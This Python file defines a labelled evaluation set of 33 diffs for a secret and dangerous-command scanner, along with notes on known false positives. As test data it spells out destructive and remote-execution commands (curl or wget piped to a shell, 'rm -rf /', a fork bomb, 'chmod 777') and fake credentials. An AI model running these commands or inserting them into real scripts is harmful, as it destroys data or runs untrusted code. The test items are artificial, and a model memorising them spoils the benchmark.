"""Ground-truth eval dataset: 33 diffs (20 unsafe, 13 safe).

Each case is a real unified diff — the harness runs it through the same
``parse_unified_diff`` + ``run_scan`` path the CLI uses, so a regression in
either the parser or an analyzer shows up as a metric change.

``expect`` holds the exact rule ids that MUST fire. An empty set means the
diff is expected to be clean; any finding there is a false positive.

The safe cases are deliberately adversarial: env-var reads, short fake keys,
``chmod 755``, ``rm -rf ./build``, plus three documentation/comment cases that
a line-scoped regex cannot distinguish from the real thing. Those three are
expected to fail today — they exist so the precision number tells the truth
instead of flattering the tool.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class EvalCase:
    """One labelled diff."""

    name: str
    category: str  # secret | dangerous-cmd | safe
    diff: str
    expect: frozenset[str]
    note: str = ""


def _new_file(path: str, lines: list[str]) -> str:
    """Build a new-file unified diff for ``path`` adding ``lines``."""
    body = "\n".join(f"+{line}" for line in lines)
    return (
        f"diff --git a/{path} b/{path}\n"
        "new file mode 100644\n"
        "index 0000000..1111111\n"
        "--- /dev/null\n"
        f"+++ b/{path}\n"
        f"@@ -0,0 +1,{len(lines)} @@\n"
        f"{body}\n"
    )


CASES: list[EvalCase] = [
    # ---------------------------------------------------------------- secrets
    EvalCase(
        name="aws-key-in-config",
        category="secret",
        diff=_new_file("app/config.py", ['AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"']),
        expect=frozenset({"secret.aws-access-key"}),
    ),
    EvalCase(
        name="github-pat-in-env-module",
        category="secret",
        diff=_new_file("lib/token.js", ['export const TOKEN = "ghp_' + "A" * 36 + '";']),
        expect=frozenset({"secret.github-token"}),
    ),
    EvalCase(
        name="rsa-private-key-block",
        category="secret",
        diff=_new_file(
            "deploy/key.py",
            [
                'KEY = """-----BEGIN RSA PRIVATE KEY-----',
                "MIIEowIBAAKCAQEA",
                '-----END RSA PRIVATE KEY-----"""',
            ],
        ),
        expect=frozenset({"secret.private-key-block"}),
    ),
    EvalCase(
        name="jwt-in-json-fixture",
        category="secret",
        diff=_new_file(
            "data/session.json",
            [
                '{"token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.'
                'dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"}'
            ],
        ),
        expect=frozenset({"secret.jwt-token"}),
    ),
    EvalCase(
        name="dotenv-committed",
        category="secret",
        diff=_new_file(".env", ["API_KEY=super-secret-value"]),
        expect=frozenset({"path.dotenv-file"}),
    ),
    EvalCase(
        name="dotenv-local-variant",
        category="secret",
        diff=_new_file(".env.local", ["DB_PASSWORD=hunter2"]),
        expect=frozenset({"path.dotenv-file"}),
    ),
    EvalCase(
        name="id-rsa-file",
        category="secret",
        diff=_new_file("deploy/id_rsa", ["MIIEowIBAAKCAQEA"]),
        expect=frozenset({"path.private-key-file"}),
    ),
    EvalCase(
        name="credentials-json",
        category="secret",
        diff=_new_file("config/credentials.json", ['{"user": "admin"}']),
        expect=frozenset({"path.credentials-file"}),
    ),
    EvalCase(
        name="pem-cert-file",
        category="secret",
        diff=_new_file("certs/server.pem", ["MIIEowIBAAKCAQEA"]),
        expect=frozenset({"path.private-key-file"}),
    ),
    EvalCase(
        name="git-internal-path",
        category="secret",
        diff=_new_file(".git/config", ["[remote]"]),
        expect=frozenset({"path.git-internal"}),
    ),
    # ---------------------------------------------------------- dangerous cmd
    EvalCase(
        name="curl-pipe-bash",
        category="dangerous-cmd",
        diff=_new_file("scripts/install.sh", ["curl -fsSL https://example.com/x.sh | bash"]),
        expect=frozenset({"cmd.curl-pipe-shell"}),
    ),
    EvalCase(
        name="wget-pipe-sh",
        category="dangerous-cmd",
        diff=_new_file("scripts/setup.sh", ["wget -qO- https://example.com/y | sh"]),
        expect=frozenset({"cmd.curl-pipe-shell"}),
    ),
    EvalCase(
        name="curl-pipe-sudo-bash",
        category="dangerous-cmd",
        diff=_new_file("bootstrap.sh", ["curl -s https://example.com/z | sudo bash"]),
        expect=frozenset({"cmd.curl-pipe-shell", "cmd.sudo-usage"}),
        note="two rules legitimately apply: piped shell AND sudo",
    ),
    EvalCase(
        name="rm-rf-root",
        category="dangerous-cmd",
        diff=_new_file("Makefile", ["clean:", "\trm -rf /"]),
        expect=frozenset({"cmd.rm-rf-root"}),
    ),
    EvalCase(
        name="rm-rf-root-in-python",
        category="dangerous-cmd",
        diff=_new_file("task.py", ['os.system("rm -rf / --no-preserve-root")']),
        expect=frozenset({"cmd.rm-rf-root"}),
    ),
    EvalCase(
        name="fork-bomb",
        category="dangerous-cmd",
        diff=_new_file("scripts/payload.sh", [":(){ :|:& };:"]),
        expect=frozenset({"cmd.fork-bomb"}),
    ),
    EvalCase(
        name="chmod-777",
        category="dangerous-cmd",
        diff=_new_file("scripts/setup.sh", ["chmod 777 /var/www/app"]),
        expect=frozenset({"cmd.chmod-777"}),
    ),
    EvalCase(
        name="chmod-recursive-777",
        category="dangerous-cmd",
        diff=_new_file("scripts/fix.sh", ["chmod -R 777 ./storage"]),
        expect=frozenset({"cmd.chmod-777"}),
    ),
    EvalCase(
        name="sudo-install",
        category="dangerous-cmd",
        diff=_new_file("scripts/provision.sh", ["sudo apt-get install -y nginx"]),
        expect=frozenset({"cmd.sudo-usage"}),
    ),
    EvalCase(
        name="sudo-in-dockerfile",
        category="dangerous-cmd",
        diff=_new_file("Dockerfile", ["RUN sudo chown -R app /app"]),
        expect=frozenset({"cmd.sudo-usage"}),
    ),
    # ------------------------------------------------------------------- safe
    EvalCase(
        name="safe-env-var-read",
        category="safe",
        diff=_new_file("app/config.py", ['key = os.environ["AWS_ACCESS_KEY_ID"]']),
        expect=frozenset(),
        note="reading a key from env is not committing a key",
    ),
    EvalCase(
        name="safe-subprocess-list",
        category="safe",
        diff=_new_file("app/run.py", ['subprocess.run(["ls", "-la"], check=True)']),
        expect=frozenset(),
        note="no shell=True, no string interpolation",
    ),
    EvalCase(
        name="safe-doc-mentions-password",
        category="safe",
        diff=_new_file("README.md", ["Set your password in the dashboard settings."]),
        expect=frozenset(),
    ),
    EvalCase(
        name="safe-short-fake-key",
        category="safe",
        diff=_new_file("tests/fixture.py", ['FAKE_KEY = "AKIA1234"']),
        expect=frozenset(),
        note="too short to be an AWS key",
    ),
    EvalCase(
        name="safe-dotenv-example",
        category="safe",
        diff=_new_file(".env.example", ["API_KEY=changeme"]),
        expect=frozenset(),
        note="template file, not a real .env",
    ),
    EvalCase(
        name="safe-chmod-755",
        category="safe",
        diff=_new_file("scripts/deploy.sh", ["chmod 755 deploy.sh"]),
        expect=frozenset(),
    ),
    EvalCase(
        name="safe-rm-build-dir",
        category="safe",
        diff=_new_file("Makefile", ["clean:", "\trm -rf ./build"]),
        expect=frozenset(),
        note="relative path, not root",
    ),
    EvalCase(
        name="safe-curl-download",
        category="safe",
        diff=_new_file("scripts/fetch.sh", ["curl -o out.json https://example.com/data"]),
        expect=frozenset(),
        note="download without a pipe to a shell",
    ),
    EvalCase(
        name="safe-short-jwt-like",
        category="safe",
        diff=_new_file("app/auth.py", ['X = "eyJhbGc.eyJzd.abc"']),
        expect=frozenset(),
        note="three segments but too short",
    ),
    EvalCase(
        name="safe-commit-message-mentions-credentials",
        category="safe",
        diff=_new_file(
            "scripts/rotate.sh",
            ['git commit -m "add credentials loader"'],
        ),
        expect=frozenset(),
        note="path rules are path-scoped, not line-scoped",
    ),
    # ------------------------------------------- adversarial: docs and comments
    # These three are the honest part of the dataset. A line-scoped regex
    # cannot tell a warning in a comment from the command itself, so they
    # SHOULD fail until the analyzer learns comment awareness. They are here
    # so the precision number reports the real weakness instead of hiding it.
    EvalCase(
        name="adv-comment-mentions-sudo",
        category="safe",
        diff=_new_file("scripts/start.sh", ["# run with sudo if the port is busy"]),
        expect=frozenset(),
        note="known weakness: cmd.sudo-usage is not comment-aware",
    ),
    EvalCase(
        name="adv-doc-warns-about-rm-rf",
        category="safe",
        diff=_new_file("docs/ops.md", ["Never run: rm -rf / on production."]),
        expect=frozenset(),
        note="known weakness: cmd.rm-rf-root matches documentation",
    ),
    EvalCase(
        name="adv-doc-quotes-curl-pipe",
        category="safe",
        diff=_new_file("docs/install.md", ["Do not do: curl https://x.sh | bash"]),
        expect=frozenset(),
        note="known weakness: cmd.curl-pipe-shell matches documentation",
    ),
]
